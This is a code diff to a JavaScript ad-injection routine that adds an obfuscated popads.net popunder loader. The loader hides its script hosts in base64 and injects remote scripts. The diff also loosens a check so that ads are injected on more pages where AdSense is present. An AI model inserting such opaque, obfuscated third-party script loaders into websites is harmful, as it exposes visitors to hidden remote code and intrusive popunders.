@@ -483,10 +483,14 @@ function loadRandomPopAds() {
    Logger.log('Iniciando SmartLink Popunder Script...');
   if (window.location.hostname === "docentestic.es") return;
   const popunders = [
+    //adsterra popup
     "https://compiledonatevanity.com/a4/e7/55/a4e7557f2067c4c0f922d9747a61a17f.js"
   ];
   const url = popunders[Math.floor(Math.random() * popunders.length)];
-  
+  //popads.net
+  (function(){var q=window,t="d30a423e37fe9b7888b7e8f56a20e472",f=[["siteId",750+158+222+4934385],["minBid",0.0005],["popundersPerIP","0"],["delayBetween",0],["default","https://compiledonatevanity.com/vg3ejyvbq?key=ca6fe018d69873f98382f717bc646ca6"],["defaultPerDay",0],["topmostLayer","auto"]],a=["d3d3LmludGVsbGlnZW5jZWFkeC5jb20vc2V4dC1hbGwuY3Nz","ZDJrbHg4N2Jnem5nY2UuY2xvdWRmcm9udC5uZXQvYkdEL2xtYXBsZS5taW4uanM="],d=-1,i,b,v=function(){clearTimeout(b);d++;if(a[d]&&!(1814345022000<(new Date).getTime()&&1<d)){i=q.document.createElement("script");i.type="text/javascript";i.async=!0;var y=q.document.getElementsByTagName("script")[0];i.src="https://"+atob(a[d]);i.crossOrigin="anonymous";i.onerror=v;i.onload=function(){clearTimeout(b);q[t.slice(0,16)+t.slice(0,16)]||v()};b=setTimeout(v,5E3);y.parentNode.insertBefore(i,y)}};if(!q[t]){try{Object.freeze(q[t]=f)}catch(e){}v()}})();
+
+
   loadScript(popunders);
   
 }
@@ -503,7 +507,7 @@ function initAppManager() {
   setTimeout(updateAmazonAffiliateTags, 1000);
 
   // Exclusión si ya hay Google AdSense en la página
-  if (window.conadsense !== undefined || window.adsbygoogle.requestNonPersonalizedAds !== 1) {
+  if (window.conadsense !== undefined) {
     Logger.warn('Google AdSense detectado. Se detiene la inyección publicitaria.');
     return;
   }
